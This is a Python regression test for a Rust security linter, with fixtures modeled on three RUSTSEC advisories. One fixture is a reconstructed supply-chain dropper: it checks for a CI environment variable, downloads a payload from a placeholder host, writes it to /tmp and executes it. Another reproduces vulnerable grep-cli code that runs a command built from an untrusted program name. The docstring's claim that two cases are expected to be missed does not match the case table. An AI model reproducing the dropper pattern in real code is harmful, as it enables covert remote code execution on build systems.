"""Regression against advisories that document the patterns we lint.

Each fixture is the *shape* of a real advisory, attributed in place:

  RUSTSEC-2021-0071  grep-cli 0.1.5 — decompressors resolved by basename
  RUSTSEC-2022-0042  rustdecimal — env-triggered download + exec (dropper)
  RUSTSEC-2022-0058  inconceivable — macro-injected UB via a feature flag

A regression suite is not a victory lap: it exists to show which advisories
the analysis actually reaches. Two of the three are expected to be *missed*,
and the test asserts exactly that, so a future rule that starts catching them
makes the suite fail until the expectation is updated deliberately.

Run from research/:  python detect/test_rustsec.py
"""

from __future__ import annotations

import sys
from pathlib import Path

try:
    from . import lint_safe
except ImportError:
    import lint_safe

REPO = Path(__file__).resolve().parents[2]

# --- RUSTSEC-2021-0071 -------------------------------------------------------
# Real vulnerable code (grep-cli 0.1.5, src/decompress.rs:139-146, Unlicense/MIT).
# The decompressor name is a struct field filled from `args[0]` two functions
# away, so the only shallow signal is "program name is not a literal".
GREP_CLI = """
impl DecompressionMatcher {
    pub fn command<P: AsRef<Path>>(&self, path: P) -> Option<Command> {
        for i in self.globs.matches(path).into_iter().rev() {
            let decomp_cmd = &self.commands[i];
            let mut cmd = Command::new(&decomp_cmd.bin);
            cmd.args(&decomp_cmd.args);
            return Some(cmd);
        }
        None
    }
}
"""

# --- RUSTSEC-2022-0042 -------------------------------------------------------
# Reconstruction from the advisory: `Decimal::new` checks GITLAB_CI, fetches a
# payload into /tmp and executes it. Not the original file (removed from
# crates.io); the shape is what the advisory describes.
RUSTDECIMAL = """
pub fn new(n: i64, scale: u32) -> Decimal {
    if std::env::var("GITLAB_CI").is_ok() {
        let payload = reqwest::blocking::get("http://example.invalid/git-updater")
            .expect("fetch")
            .bytes()
            .expect("bytes");
        std::fs::write("/tmp/git-updater.bin", &payload).expect("write");
        std::process::Command::new("/tmp/git-updater.bin")
            .spawn()
            .expect("spawn");
    }
    Decimal { n, scale }
}
"""

# --- RUSTSEC-2022-0058 -------------------------------------------------------
# Reconstruction from the advisory: a macro that is insta-UB with a feature on.
INCONCEIVABLE = """
pub fn add(a: i32, b: i32) -> i32 {
    inconceivable!(a + b)
}
"""

CASES = [
    {
        "id": "RUSTSEC-2021-0071",
        "name": "grep-cli decompressor by field name",
        "src": GREP_CLI,
        "expect": {"exec_tainted_cmd"},
        "forbid": set(),
        "verdict": "covered",
    },
    {
        "id": "RUSTSEC-2022-0042",
        "name": "rustdecimal env-triggered dropper",
        "src": RUSTDECIMAL,
        "expect": {"exec_written_path"},
        "forbid": set(),
        "verdict": "covered",
    },
    {
        "id": "RUSTSEC-2022-0058",
        "name": "inconceivable macro-injected UB",
        "src": INCONCEIVABLE,
        "expect": set(),
        "forbid": set(),
        "verdict": "out-of-scope",
    },
]


def _real_grep_cli() -> Path:
    return (
        REPO
        / "research/transitions/external/crates/grep-cli/0.1.5"
        / "grep-cli-0.1.5/src/decompress.rs"
    )


def main() -> int:
    failures = 0
    rows = []
    for case in CASES:
        found = lint_safe.lint_source(case["src"], path="fixture.rs")
        rules = {f.rule for f in found}
        ok = case["expect"] <= rules and not (case["forbid"] & rules)
        if case["verdict"] == "gap" and rules:
            # a gap that starts firing is news, not a pass
            ok = False
        failures += 0 if ok else 1
        detail = ", ".join(f"{f.rule}(L{f.line})" for f in found) or "no finding"
        rows.append((case["id"], case["verdict"], detail))
        print(f"[{'PASS' if ok else 'FAIL'}] {case['id']}  {case['name']}: {detail}")
        if not ok:
            print(f"        expected {sorted(case['expect'])}, got {sorted(rules)}")

    # The vendored vulnerable source, when present, must fire on the real line.
    real = _real_grep_cli()
    if real.is_file():
        found = lint_safe.lint_source(real.read_text(), path=str(real))
        hits = [f for f in found if f.rule == "exec_tainted_cmd"]
        ok = any(f.line == 143 for f in hits)
        failures += 0 if ok else 1
        lines = sorted({f.line for f in hits})
        print(f"[{'PASS' if ok else 'FAIL'}] real grep-cli 0.1.5 decompress.rs: "
              f"exec_tainted_cmd at {lines}")
        if not ok:
            print(f"        expected a hit on line 143, got {lines}")
    else:
        print("[SKIP] vendored grep-cli 0.1.5 not present")

    print("\ncoverage:")
    for rid, verdict, detail in rows:
        print(f"  {rid:18s} {verdict:13s} {detail}")
    print(f"\n{len(CASES) - failures}/{len(CASES)} fixture expectations hold")
    return 0 if failures == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
